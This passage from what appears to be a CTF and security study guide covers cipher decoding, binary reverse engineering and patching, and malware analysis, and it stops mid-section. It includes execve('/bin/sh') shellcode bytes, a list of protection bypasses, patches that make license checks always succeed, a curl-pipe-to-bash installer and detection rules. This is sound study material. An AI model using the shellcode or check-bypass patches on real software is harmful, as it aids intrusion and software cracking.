# Multi-byte XOR
python3 << 'EOF'
def xor_decrypt(ciphertext, key):
    return bytes([c ^ key[i % len(key)] for i, c in enumerate(ciphertext)])

ciphertext = bytes.fromhex("your_hex_here")
key = b"KEY"
print(xor_decrypt(ciphertext, key))
EOF

# XOR two files
python3 << 'EOF'
with open('file1.bin', 'rb') as f1, open('file2.bin', 'rb') as f2:
    data1 = f1.read()
    data2 = f2.read()
    result = bytes([a ^ b for a, b in zip(data1, data2)])
    with open('xor_result.bin', 'wb') as out:
        out.write(result)
EOF

# xortool (automated XOR analysis)
xortool ciphertext.bin
xortool -l 4 ciphertext.bin  # Specify key length
xortool -c 20 ciphertext.bin # Most frequent char is space (0x20)
```

### Base Encoding Detection

```bash
# Base64
echo "SGVsbG8gV29ybGQ=" | base64 -d

# Base32
echo "JBSWY3DPEBLW64TMMQ======" | base32 -d

# Base58 (Bitcoin)
# No padding, no confusing characters (0, O, I, l)

# Base85/Ascii85
# Used in PDF, PostScript

# Hexadecimal
echo "48656c6c6f" | xxd -r -p

# URL encoding
echo "Hello%20World" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"

# Multiple layers (common in CTF)
echo "DATA" | base64 | base64 | base64  # Triple encoded
```

### Transposition Ciphers

Rearrange character positions:

```bash
# Rail Fence Cipher
python3 << 'EOF'
def rail_fence_decrypt(ciphertext, rails):
    fence = [['' for _ in range(len(ciphertext))] for _ in range(rails)]
    direction = 1
    row = 0
    
    # Mark positions
    for col in range(len(ciphertext)):
        fence[row][col] = '*'
        if row == 0:
            direction = 1
        elif row == rails - 1:
            direction = -1
        row += direction
    
    # Fill with ciphertext
    index = 0
    for r in range(rails):
        for c in range(len(ciphertext)):
            if fence[r][c] == '*':
                fence[r][c] = ciphertext[index]
                index += 1
    
    # Read plaintext
    result = ""
    row = 0
    direction = 1
    for col in range(len(ciphertext)):
        result += fence[row][col]
        if row == 0:
            direction = 1
        elif row == rails - 1:
            direction = -1
        row += direction
    
    return result

ciphertext = "WECRLTEERDSOEEFEAOCAIVDEN"
for rails in range(2, 10):
    print(f"Rails {rails}: {rail_fence_decrypt(ciphertext, rails)}")
EOF

# Columnar transposition
# Requires key/column order
```

### Bacon Cipher

Binary encoding using two different forms (A/B):

```bash
python3 << 'EOF'
bacon = {
    'AAAAA': 'A', 'AAAAB': 'B', 'AAABA': 'C', 'AAABB': 'D', 'AABAA': 'E',
    'AABAB': 'F', 'AABBA': 'G', 'AABBB': 'H', 'ABAAA': 'I', 'ABAAB': 'J',
    'ABABA': 'K', 'ABABB': 'L', 'ABBAA': 'M', 'ABBAB': 'N', 'ABBBA': 'O',
    'ABBBB': 'P', 'BAAAA': 'Q', 'BAAAB': 'R', 'BAABA': 'S', 'BAABB': 'T',
    'BABAA': 'U', 'BABAB': 'V', 'BABBA': 'W', 'BABBB': 'X', 'BBAAA': 'Y',
    'BBAAB': 'Z'
}

# Convert text with A/B patterns (case, font, etc.)
ciphertext = "AABBAABAABA"  # Example
result = ""
for i in range(0, len(ciphertext), 5):
    chunk = ciphertext[i:i+5]
    result += bacon.get(chunk, '?')
print(result)
EOF
```

### Morse Code

```bash
# Morse to text
python3 << 'EOF'
morse_dict = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '-----': '0', '.----': '1', '..---': '2', '...--': '3',
    '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8',
    '----.': '9'
}

morse = ".... . .-.. .-.. ---"
result = ''.join(morse_dict.get(code, '?') for code in morse.split())
print(result)
EOF
```

### Affine Cipher

Combination of multiplicative and Caesar ciphers:

```python
# Affine cipher: E(x) = (ax + b) mod 26
# Decrypt: D(x) = a^-1(x - b) mod 26

def mod_inverse(a, m):
    for i in range(1, m):
        if (a * i) % m == 1:
            return i
    return None

def affine_decrypt(ciphertext, a, b):
    a_inv = mod_inverse(a, 26)
    if not a_inv:
        return None
    
    result = ""
    for char in ciphertext:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            x = ord(char) - ascii_offset
            plaintext_num = (a_inv * (x - b)) % 26
            result += chr(plaintext_num + ascii_offset)
        else:
            result += char
    return result

# Brute force affine (a must be coprime with 26)
valid_a = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]
ciphertext = "YOUR CIPHERTEXT"
for a in valid_a:
    for b in range(26):
        plaintext = affine_decrypt(ciphertext, a, b)
        if plaintext:
            print(f"a={a:2d}, b={b:2d}: {plaintext}")
```

### Playfair Cipher

Digraph substitution cipher:

```bash
# Manual Playfair requires key matrix
# Use online tools or implement matrix-based decryption
# - dcode.fr/playfair-cipher
```

### Book/Running Key Cipher

Uses text from book as key:

```bash
# Requires knowing the book/text source
# Typically XOR or modulo addition with book text
```

## Binary Analysis

Analyzing compiled binaries for vulnerabilities, logic, and hidden data.

### File Information

```bash
# File type identification
file binary
file -i binary  # MIME type

# Strings extraction
strings binary
strings -n 10 binary  # Minimum length 10
strings -e l binary   # 16-bit little-endian
strings -e b binary   # 16-bit big-endian

# Binary information
readelf -h binary     # ELF header
readelf -l binary     # Program headers
readelf -S binary     # Section headers
readelf -s binary     # Symbol table
readelf -d binary     # Dynamic section

# Check for stripped binary
readelf -s binary | grep -i debug
file binary | grep -i "not stripped"

# Architecture detection
readelf -h binary | grep Machine
file binary
```

### Disassembly

**objdump:**

```bash
# Disassemble all
objdump -d binary

# Disassemble specific section
objdump -d -j .text binary

# With source code (if available)
objdump -S binary

# Intel syntax (more readable)
objdump -d -M intel binary

# Full headers and disassembly
objdump -x -d -M intel binary > disassembly.txt

# Dump specific function
objdump -d binary | grep -A 50 "<main>:"
```

**radare2:**

```bash
# Open binary
r2 binary

# Commands in r2
aaa          # Analyze all
afl          # List functions
pdf @main    # Disassemble main function
s main       # Seek to main
VV           # Visual mode (graph)
px 100       # Print 100 bytes hex
ps @addr     # Print string at address
/ string     # Search for string
/x 4883ec10  # Search for hex bytes
q            # Quit

# One-liner analysis
r2 -qc 'aaa; afl' binary
r2 -qc 'aaa; pdf @main' binary

# Decompile with r2ghidra
r2 -A binary
[0x00001060]> pdg  # Pseudo-code decompilation
```

**Ghidra:**

```bash
# Launch Ghidra
ghidraRun

# Steps:
# 1. Create new project
# 2. Import binary (File -> Import File)
# 3. Analyze (Analysis -> Auto Analyze)
# 4. View decompiled code (Window -> Decompile)

# Headless Ghidra analysis
analyzeHeadless /path/to/project ProjectName -import binary -scriptPath /path/to/scripts
```

**IDA (Interactive Disassembler):**

```bash
# IDA Free (limited to x86/x64)
# Commercial tool with advanced features
# Produces high-quality decompilation

# IDA Pro features:
# - Debugger
# - Hex-Rays decompiler
# - Plugin ecosystem
# - Collaborative reverse engineering
```

**Binary Ninja:**

```bash
# Modern disassembler/decompiler
# Clean UI, good for CTF

# Features:
# - Intermediate representations (IL)
# - Plugin API (Python)
# - Collaboration
```

### Dynamic Analysis

**ltrace (library call tracer):**

```bash
# Trace library calls
ltrace ./binary

# Trace specific calls
ltrace -e malloc,free ./binary

# Save output
ltrace -o trace.txt ./binary

# Filter specific library
ltrace -l libc.so.6 ./binary
```

**strace (system call tracer):**

```bash
# Trace system calls
strace ./binary

# Trace specific calls
strace -e open,read,write ./binary

# Trace file operations
strace -e trace=file ./binary

# Trace network operations
strace -e trace=network ./binary

# Follow child processes
strace -f ./binary

# Show timestamps
strace -t ./binary
strace -tt ./binary  # Microsecond precision

# Count calls
strace -c ./binary

# Attach to running process
strace -p PID

# Save output
strace -o trace.txt ./binary

# Show string arguments fully
strace -s 1000 ./binary
```

**gdb (GNU Debugger):**

```bash
# Start debugging
gdb ./binary

# GDB commands
run                     # Run program
run arg1 arg2          # Run with arguments
break main             # Set breakpoint at main
break *0x08048000      # Break at address
info breakpoints       # List breakpoints
delete 1               # Delete breakpoint 1
continue               # Continue execution
step                   # Step into (source level)
stepi                  # Step instruction
next                   # Step over (source level)
nexti                  # Next instruction
finish                 # Run until function returns

# Examine memory/registers
info registers         # Show all registers
print $eax             # Print EAX register
print variable         # Print variable
x/10x $esp            # Examine 10 words at ESP (hex)
x/10i $eip            # Examine 10 instructions at EIP
x/s 0x08048000        # Examine string at address
x/10wx 0x08048000     # Examine 10 words (hex)

# Disassembly
disassemble main       # Disassemble function
disassemble 0x08048000 # Disassemble address

# Memory modification
set $eax=0x1234       # Set register
set {int}0x08048000=0x90909090  # Patch memory

# Search memory
find 0x08048000, +0x1000, "flag"  # Search for string

# Hooks and automation
source script.gdb      # Load GDB script
define hook-stop       # Run after each stop
  x/10i $eip
end
```

**GDB with pwndbg/gef/peda:**

```bash
# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Install gef
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Enhanced commands (pwndbg)
gdb ./binary
context               # Show context (registers, stack, code)
checksec              # Check binary protections
vmmap                 # Show memory mappings
telescope $esp        # Follow pointers
search "string"       # Search memory for string
rop                   # Find ROP gadgets
cyclic 100            # Generate De Bruijn pattern
cyclic -l 0x61616161  # Find offset in pattern
```

**Frida (Dynamic instrumentation):**

```bash
# Install Frida
pip3 install frida-tools

# List running processes
frida-ps

# Attach to process
frida binary

# Frida script example
cat > hook.js << 'EOF'
// Hook a function
Interceptor.attach(Module.findExportByName(null, 'strcmp'), {
    onEnter: function(args) {
        console.log('strcmp called');
        console.log('arg1: ' + Memory.readUtf8String(args[0]));
        console.log('arg2: ' + Memory.readUtf8String(args[1]));
    },
    onLeave: function(retval) {
        console.log('Return value: ' + retval);
    }
});
EOF

# Run Frida script
frida -l hook.js binary

# Frida Python API
python3 << 'EOF'
import frida
import sys

def on_message(message, data):
    print(message)

session = frida.attach("binary")
script = session.create_script("""
    Interceptor.attach(Module.findExportByName(null, 'strcmp'), {
        onEnter: function(args) {
            send({
                'arg1': Memory.readUtf8String(args[0]),
                'arg2': Memory.readUtf8String(args[1])
            });
        }
    });
""")
script.on('message', on_message)
script.load()
sys.stdin.read()
EOF
```

### Binary Protections

**checksec:**

```bash
# Check binary security features
checksec --file=binary

# Common protections:
# RELRO (Relocation Read-Only)
#   - Partial: GOT writable after relocation
#   - Full: GOT read-only after relocation
# Stack Canary: Stack buffer overflow protection
# NX (No Execute): Stack/heap not executable (DEP)
# PIE (Position Independent Executable): ASLR for executable
# FORTIFY: Enhanced compiler protections

# Manual checks
readelf -l binary | grep GNU_STACK  # Check NX
readelf -d binary | grep BIND_NOW   # Check RELRO
readelf -h binary | grep Type       # Check PIE (DYN vs EXEC)
```

**Bypassing protections:**

[Inference] Each protection mechanism has potential bypasses:

- **NX/DEP**: Return-oriented programming (ROP), ret2libc
- **Stack Canary**: Leak canary value, overwrite without triggering
- **ASLR/PIE**: Information disclosure to leak addresses
- **RELRO**: Attack before relocation (Partial RELRO) or other vectors

### Packing and Obfuscation Detection

```bash
# Detect packing
upx -t binary        # Test for UPX packing
strings binary | wc -l  # Low string count may indicate packing

# Entropy check (high = packed/encrypted)
binwalk -E binary

# Detect common packers
# UPX: "UPX!" signature
# ASPack: "aPLib" strings
# PECompact: ".pec" section
# VMProtect: ".vmp" section

# Section analysis
readelf -S binary
# Look for unusual section names/sizes
# Packed binaries often have large .text, small other sections

# Manual unpacking (run and dump from memory)
gdb ./binary
break *0x08048000    # Break at OEP (Original Entry Point)
run
dump memory unpacked.bin 0x08048000 0x08050000
```

**Unpacking UPX:**

```bash
# Unpack UPX-packed binary
upx -d binary -o unpacked

# Manual unpacking steps:
# 1. Run in debugger
# 2. Find tail jump (JMP to OEP)
# 3. Set breakpoint at OEP
# 4. Dump memory from OEP
```

### Anti-Debugging Detection

```bash
# Common anti-debugging techniques:

# 1. ptrace check (Linux)
grep -i ptrace disassembly.txt

# 2. Timing checks
# Binary measures execution time between points

# 3. Debugger detection via /proc/self/status
cat /proc/self/status | grep TracerPid

# 4. SIGTRAP handling
# Binary installs INT3 and checks if debugger catches

# Bypass in GDB:
catch signal SIGTRAP    # Catch SIGTRAP
handle SIGTRAP nostop   # Don't stop on SIGTRAP

# Set environment variables
unset LINES COLUMNS     # Some programs check terminal
```

### Function Analysis

**Identifying key functions:**

```bash
# Find main function
objdump -d binary | grep "<main>:"
readelf -s binary | grep " main"

# Find interesting functions
strings binary | grep -i "flag\|password\|key"
objdump -d binary | grep "call.*<strcmp@plt>"
objdump -d binary | grep "call.*<system@plt>"

# Cross-references
radare2 binary
aaa
axt @sym.imp.strcmp    # Find cross-references to strcmp
```

**Common function signatures:**

```bash
# Input functions
scanf, gets, fgets, read, getchar, getline

# Output functions
printf, puts, write, putchar

# String comparison
strcmp, strncmp, memcmp, strcasecmp

# Memory operations
malloc, calloc, free, memcpy, memset, memmove

# File operations
fopen, fread, fwrite, fclose

# Dangerous functions
system, exec*, strcpy, strcat, gets, sprintf
```

### Reversing Techniques

**Identifying algorithms:**

```bash
# Look for magic constants (algorithm indicators)
# AES: 0x63, 0x7C, 0x77, 0x7B (S-box values)
# MD5: 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
# SHA-1: 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0
# RC4: Permutation array initialization (0-255)
# CRC32: Polynomial 0xEDB88320

# Search for constants
strings binary | grep -E "[0-9a-f]{8}"
r2 -qc '/x 67452301' binary  # Search hex in radare2
```

**Control flow analysis:**

```python
# Pseudo-code reconstruction approach
# 1. Identify basic blocks
# 2. Recognize control structures (if/else, loops)
# 3. Identify function calls and parameters
# 4. Reconstruct high-level logic

# Example: Password check
if (strcmp(input, "secret") == 0) {
    print("Correct!");
} else {
    print("Wrong!");
}

# Assembly pattern recognition:
# call strcmp
# test eax, eax    ; Check return value
# jne wrong        ; Jump if not equal
```

**Mathematical operations:**

```bash
# Common patterns in assembly

# XOR encryption: xor rax, rbx
# Modulo: div (division) followed by using remainder (rdx)
# Power operations: Loop with multiplication
# Hash functions: Complex bit operations, rotations

# Bit operations
# AND: test/and instructions
# OR: or instruction
# XOR: xor instruction
# Shift: shl/shr/sal/sar instructions
# Rotate: rol/ror/rcl/rcr instructions
```

### Patching Binaries

```bash
# Hex editing
hexedit binary
xxd binary > binary.hex  # Convert to hex
# Edit hex
xxd -r binary.hex > binary_patched  # Revert to binary

# radare2 patching
r2 -w binary              # Open in write mode
s 0x08048000             # Seek to address
wx 9090                  # Write hex (NOP)
wa "xor eax,eax; ret"    # Write assembly
q

# Patch with dd
printf '\x90\x90' | dd of=binary bs=1 seek=$((0x1234)) conv=notrunc

# Python patching
python3 << 'EOF'
with open('binary', 'r+b') as f:
    f.seek(0x1234)
    f.write(b'\x90\x90')  # Write NOPs
EOF

# Common patches:
# JE -> JMP (74 -> EB): Always jump
# JNE -> JMP (75 -> EB): Always jump
# JMP -> NOP (EB -> 90): Never jump
# CALL -> NOP (E8 -> 90 90 90 90 90): Skip function call
# CMP -> XOR (compare -> always equal)
```

### Windows PE Analysis

```bash
# PE file structure
# DOS Header (MZ signature)
# PE Header (PE\0\0 signature)
# Section headers (.text, .data, .rdata, .rsrc)
# Sections

# Tools for PE analysis
pefile (Python library)
peview, pestudio (Windows)
objdump (cross-platform)

# Python PE analysis
python3 << 'EOF'
import pefile

pe = pefile.PE('binary.exe')

# Basic info
print(f"Entry Point: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:x}")
print(f"Image Base: 0x{pe.OPTIONAL_HEADER.ImageBase:x}")

# Sections
for section in pe.sections:
    print(f"{section.Name.decode().strip()}: "
          f"VirtualAddress=0x{section.VirtualAddress:x}, "
          f"Size={section.SizeOfRawData}")

# Imports
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"\n{entry.dll.decode()}")
    for imp in entry.imports:
        print(f"  {imp.name.decode() if imp.name else 'Ordinal ' + str(imp.ordinal)}")

# Exports (if present)
if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        print(f"{exp.name.decode() if exp.name else 'Ordinal ' + str(exp.ordinal)}")

# Resources
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for resource_type in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        if hasattr(resource_type, 'directory'):
            for resource_id in resource_type.directory.entries:
                if hasattr(resource_id, 'directory'):
                    for resource_lang in resource_id.directory.entries:
                        print(f"Resource at offset 0x{resource_lang.data.struct.OffsetToData:x}")
EOF
```

### ELF Analysis

```bash
# ELF structure
# ELF Header
# Program Headers (segments for loading)
# Section Headers (sections for linking)

# Analyze ELF
readelf -a binary

# Extract sections
objcopy --dump-section .rodata=rodata.bin binary

# Add new section
objcopy --add-section .newsec=data.bin binary binary_modified

# Symbols
nm binary                # List symbols
nm -D binary            # Dynamic symbols only
nm -C binary            # Demangle C++ symbols

# Dependencies
ldd binary              # List dynamic dependencies
objdump -p binary | grep NEEDED

# Dynamic section
readelf -d binary
objdump -p binary
```

### Decompilation

**Ghidra decompilation workflow:**

```
1. Import binary (File > Import File)
2. Run auto-analysis (Analysis > Auto Analyze)
3. Navigate to main() or entry point
4. View decompiled code (Window > Decompile)
5. Rename variables/functions for clarity
6. Add comments
7. Export analysis
```

**IDA decompilation (Hex-Rays):**

```
1. Load binary in IDA
2. Wait for auto-analysis
3. Press F5 on function for decompilation
4. Rename variables (N key)
5. Change types (Y key)
6. Add comments (; key)
```

**Online decompilers:**

- https://dogbolt.org/ (Multiple decompilers)
- https://www.decompiler.com/
- Compiler Explorer (godbolt.org) - For comparing compiled output

### Code Obfuscation Patterns

**Opaque predicates:**

```asm
; Always true but looks conditional
xor eax, eax
jz label          ; Always jumps
; Dead code here
label:
```

**Junk instructions:**

```asm
push eax
pop eax           ; No effect
xor eax, eax
xor eax, eax      ; Still zero
```

**Control flow flattening:**

```
; Instead of linear flow:
; A -> B -> C -> D

; Uses dispatcher:
dispatcher:
  switch(state)
    case 0: goto A
    case 1: goto B
    case 2: goto C
    case 3: goto D
```

**String obfuscation:**

```python
# Strings built at runtime
char str[10];
str[0] = 0x66;  # 'f'
str[1] = 0x6c;  # 'l'
str[2] = 0x61;  # 'a'
str[3] = 0x67;  # 'g'
str[4] = 0x00;  # null

# XOR encrypted strings
char encrypted[] = "\x0e\x0c\x01\x07";
char key = 0x6a;
for(int i = 0; i < 4; i++)
    encrypted[i] ^= key;
# Result: "flag"
```

### Shellcode Analysis

```bash
# Extract shellcode from binary
objdump -d -M intel shellcode.bin

# Analyze with sctest (libemu)
sctest -vvv -S -s 1000 < shellcode.bin

# Disassemble raw shellcode
echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" > shellcode.bin
ndisasm -b 32 shellcode.bin

# Online shellcode tools
# - https://defuse.ca/online-x86-assembler.htm
# - https://shell-storm.org/online/Online-Assembler-and-Disassembler/

# Common shellcode patterns
# execve("/bin/sh"):
# 31 c0                 xor    eax,eax
# 50                    push   eax
# 68 2f 2f 73 68        push   0x68732f2f
# 68 2f 62 69 6e        push   0x6e69622f
# 89 e3                 mov    ebx,esp
# 50                    push   eax
# 53                    push   ebx
# 89 e1                 mov    ecx,esp
# b0 0b                 mov    al,0xb
# cd 80                 int    0x80
```

### CTF-Specific Reversing Techniques

**Flag format detection:**

```bash
# Search for flag patterns
strings binary | grep -E "(flag|FLAG|CTF|picoCTF|HTB)"
strings binary | grep -E "^\w+\{.*\}$"

# Common formats:
# flag{...}
# CTF{...}
# picoCTF{...}
# HTB{...}
```

**License/serial key validation:**

```python
# Typical validation flow:
# 1. Read user input
# 2. Transform input (hash, encrypt, algorithm)
# 3. Compare with hardcoded value
# 4. Display success/failure

# Approach:
# 1. Find comparison (strcmp, memcmp)
# 2. Set breakpoint before comparison
# 3. Examine expected value
# 4. OR patch comparison to always succeed
```

**Crackme patterns:**

```bash
# Common crackme types:
# 1. Simple password check (strcmp)
# 2. Mathematical algorithm (sum, product, XOR)
# 3. Encryption/encoding (Base64, XOR, custom)
# 4. Time-based (must execute quickly)
# 5. Anti-debugging (detects debugger)
# 6. Network-based (connects to server)

# Approach:
# 1. Static analysis first (strings, functions)
# 2. Dynamic analysis if stuck (gdb, ltrace)
# 3. Identify key comparison/validation
# 4. Work backwards to find valid input
# 5. OR patch to always succeed
```

**Hidden functionality:**

```bash
# Look for:
# - Unused/unreferenced functions
# - Command-line argument parsing (argc/argv)
# - Environment variable checks (getenv)
# - File reading (fopen, read)
# - Network connections (socket, connect)

# Find unreferenced functions
readelf -s binary | grep FUNC
# Check if referenced in disassembly
```

### Automated Analysis Tools

**angr (Symbolic execution):**

```python
import angr
import claripy

# Load binary
proj = angr.Project('./binary', auto_load_libs=False)

# Create symbolic input
flag = claripy.BVS('flag', 8 * 32)  # 32-byte symbolic input

# Create initial state
state = proj.factory.entry_state(args=['./binary'], stdin=flag)

# Add constraints (e.g., printable characters)
for byte in flag.chop(8):
    state.add_constraints(byte >= 0x20, byte <= 0x7e)

# Create simulation manager
simgr = proj.factory.simulation_manager(state)

# Find path to success
simgr.explore(find=lambda s: b"Correct" in s.posix.dumps(1))

# Get solution
if simgr.found:
    solution = simgr.found[0].posix.dumps(0)
    print(f"Flag: {solution}")
```

**Binary Ninja IL analysis:**

```python
import binaryninja as bn

# Open binary
bv = bn.BinaryViewType.get_view_of_file("binary")

# Analyze
bv.update_analysis_and_wait()

# Get function
main = bv.get_function_at(bv.entry_point)

# Iterate through instructions
for block in main.low_level_il:
    for instr in block:
        print(instr)
```

**Cutter (Radare2 GUI):**

```bash
# Launch Cutter
cutter binary

# Features:
# - Graph view of control flow
# - Decompiler (r2ghidra)
# - Hex editor
# - Debugger integration
# - Python scripting
```

### Malware Analysis Techniques

[Inference] While CTF binaries aren't true malware, they often employ similar obfuscation techniques:

**Static malware indicators:**

```bash
# Suspicious imports
readelf -d binary | grep -E "(socket|connect|exec|system|fork)"

# Packed/encrypted sections
readelf -S binary | awk '{print $6}' | sort | uniq -c

# High entropy (encryption/packing)
binwalk -E binary

# Embedded files
binwalk binary
foremost binary
```

**Behavioral analysis:**

```bash
# Run in isolated environment (VM, container)
docker run -it --rm ubuntu bash

# Monitor with strace
strace -o trace.log -s 1000 -f ./binary

# Monitor network
tcpdump -i any -w traffic.pcap &
./binary

# Check modified files
find / -mmin -5 2>/dev/null  # Files modified in last 5 minutes
```

### CTF Reverse Engineering Workflow

```bash
# 1. Initial reconnaissance
file binary
strings binary | less
checksec --file=binary

# 2. Static analysis
objdump -d -M intel binary | less
radare2 -A binary
# or
ghidra binary

# 3. Identify key functions
strings binary | grep -i "flag\|password\|correct"
objdump -d binary | grep "<main>:" -A 100

# 4. Dynamic analysis (if needed)
ltrace ./binary
strace ./binary
gdb ./binary

# 5. Extract flag
# - From strings
# - From memory during execution
# - By understanding algorithm
# - By patching binary

# 6. Verify
./binary
# Enter discovered flag/key
```

## Important Related Topics

- **Exploit Development** (Buffer overflows, ROP, format strings) - Exploiting discovered vulnerabilities
- **Assembly Language** (x86, x64, ARM) - Understanding compiled code
- **Operating System Internals** (Memory management, system calls) - Context for binary behavior
- **Cryptanalysis** (Statistical attacks, known-plaintext) - Breaking weak crypto implementations
- **Malware Analysis** (Sandbox, behavioral analysis) - Advanced evasion techniques

---

## Malware Analysis

Malware analysis examines suspicious executables to understand behavior, identify indicators of compromise (IOCs), extract embedded configurations, and develop detection signatures. Analysis follows static (without execution) and dynamic (runtime observation) methodologies.

### Static Malware Analysis

**File Identification and Metadata**

```bash
# File type identification
file suspicious.exe

# Detailed file information
exiftool suspicious.exe

# PE file analysis (Windows executables)
peframe suspicious.exe
peframe -j suspicious.exe  # JSON output

# Get file hashes
md5sum suspicious.exe
sha1sum suspicious.exe
sha256sum suspicious.exe

# Multi-hash generation
rhash --md5 --sha1 --sha256 suspicious.exe

# VirusTotal lookup (API key required)
vt-cli file suspicious.exe
# Or: curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' -F 'file=@suspicious.exe' -F 'apikey=YOUR_API_KEY'

# Check if file is packed/obfuscated
exiftool suspicious.exe | grep -i "entropy"
```

**String Extraction**

```bash
# Basic string extraction
strings suspicious.exe

# Minimum string length
strings -n 8 suspicious.exe

# Unicode strings (UTF-16LE)
strings -e l suspicious.exe

# Both ASCII and Unicode
strings -a suspicious.exe

# Output to file with addresses
strings -t x suspicious.exe > strings.txt

# Filter for interesting patterns
strings suspicious.exe | grep -iE "(http|ftp|password|user|admin|key|token)"

# IP addresses
strings suspicious.exe | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b'

# URLs
strings suspicious.exe | grep -oE '(http|https|ftp)://[a-zA-Z0-9./?=_-]*'

# FLOSS - Advanced string deobfuscation
floss suspicious.exe
floss -a suspicious.exe  # all strings including obfuscated
```

**PE (Portable Executable) Analysis**

```bash
# pefile (Python library)
python3 -c "import pefile; pe = pefile.PE('suspicious.exe'); print(pe.dump_info())"

# PE headers
objdump -x suspicious.exe

# Import Address Table (IAT)
objdump -p suspicious.exe | grep "DLL Name"

# Exported functions
objdump -p suspicious.exe | grep "Export"

# Sections analysis
readelf -S suspicious.exe  # ELF files
objdump -h suspicious.exe  # PE files

# PEiD - packer/compiler detection
# [Unverified: Windows tool, may require Wine on Linux]

# DIE (Detect It Easy) - cross-platform
diec suspicious.exe
```

**pestudio - PE Static Analysis (Windows)**

```
# GUI tool for Windows PE analysis
# Features:
# - VirusTotal integration
# - Imports/exports enumeration
# - Entropy calculation
# - Certificate validation
# - Suspicious indicators
# [Inference: Primarily Windows-based tool]
```

**Binary Entropy Calculation**

```bash
# Calculate entropy (high entropy = packed/encrypted)
python3 << EOF
import math
from collections import Counter

with open('suspicious.exe', 'rb') as f:
    data = f.read()
    
counter = Counter(data)
length = len(data)
entropy = -sum((count/length) * math.log2(count/length) for count in counter.values())
print(f"Entropy: {entropy:.4f}")
# Values > 7.0 typically indicate packing/encryption
EOF

# binwalk entropy analysis
binwalk -E suspicious.exe
```

**Packer Detection and Unpacking**

```bash
# UPX detection
upx -t suspicious.exe

# UPX unpacking
upx -d suspicious.exe -o unpacked.exe

# Generic unpacker attempts
# [Inference: Manual unpacking often required for custom packers]

# Detect common packers
strings suspicious.exe | grep -i "UPX\|ASPack\|PECompact\|Themida\|VMProtect"

# PEiD signatures
# [Unverified: Signature database maintenance]
```

**Import/Export Analysis**

```bash
# List imported DLLs and functions
objdump -p suspicious.exe | grep "DLL Name" -A 50

# Suspicious API calls to look for:
# - CreateRemoteThread, WriteProcessMemory (injection)
# - VirtualAllocEx, VirtualProtect (memory manipulation)
# - CreateProcess, ShellExecute (execution)
# - InternetOpen, HttpSendRequest (network)
# - CryptEncrypt, CryptDecrypt (encryption)
# - RegSetValue, RegCreateKey (persistence)
# - CreateService, StartService (service manipulation)

# pefile extraction
python3 << EOF
import pefile
pe = pefile.PE('suspicious.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(entry.dll.decode())
    for imp in entry.imports:
        print(f"  {imp.name.decode() if imp.name else 'Ordinal: ' + str(imp.ordinal)}")
EOF
```

**YARA Rule Scanning**

```bash
# Installation
apt-get install yara

# Scan with YARA rules
yara rules.yar suspicious.exe

# Scan directory recursively
yara -r rules.yar /path/to/samples/

# Multiple rule files
yara rule1.yar rule2.yar suspicious.exe

# Common YARA rule repositories
git clone https://github.com/Yara-Rules/rules.git
yara rules/malware/APT_*.yar suspicious.exe

# Create custom YARA rule
cat > custom.yar << 'EOF'
rule SuspiciousStrings {
    meta:
        description = "Detects suspicious strings"
    strings:
        $s1 = "cmd.exe" ascii
        $s2 = "powershell" nocase
        $s3 = /https?:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/
    condition:
        2 of them
}
EOF

yara custom.yar suspicious.exe
```

**Signature-Based Detection**

```bash
# ClamAV scanning
clamscan suspicious.exe

# Update signatures
freshclam

# Verbose scan
clamscan -v suspicious.exe

# Scan directory
clamscan -r /path/to/directory/

# YARA + ClamAV integration
# [Inference: Some AV engines use YARA internally]
```

### Automated Malware Analysis Sandboxes

**Cuckoo Sandbox**

```bash
# Submit sample for analysis
cuckoo submit suspicious.exe

# Submit with specific options
cuckoo submit --package exe --timeout 120 suspicious.exe

# Submit URL
cuckoo submit --url http://malicious-site.com

# View results
cuckoo web

# API submission
curl -F file=@suspicious.exe http://localhost:8090/tasks/create/file
```

**ANY.RUN (Online Interactive Sandbox)**

[Inference: Cloud-based service with free tier limitations]

```bash
# Upload via web interface: https://any.run
# Interactive analysis capabilities
# Network traffic capture
# Process monitoring
# Real-time interaction
```

**Joe Sandbox (Commercial/Cloud)**

[Unverified: Requires subscription for full features]

**Hybrid Analysis (Free/Limited)**

```bash
# Web interface: https://www.hybrid-analysis.com
# API submission (requires API key)
curl -X POST https://www.hybrid-analysis.com/api/v2/submit/file \
  -H "api-key: YOUR_API_KEY" \
  -H "user-agent: Falcon Sandbox" \
  -F "file=@suspicious.exe"
```

### Reverse Engineering Environment Setup

**REMnux - Malware Analysis Linux Distribution**

```bash
# Download REMnux VM
# https://remnux.org/

# Or install toolkit on existing system
wget https://remnux.org/remnux-cli
chmod +x remnux-cli
sudo ./remnux-cli install

# Includes tools: IDA Free, Radare2, Ghidra, YARA, Volatility, etc.
```

**Windows Analysis VM Setup**

```powershell
# Disable Windows Defender (analysis VM only)
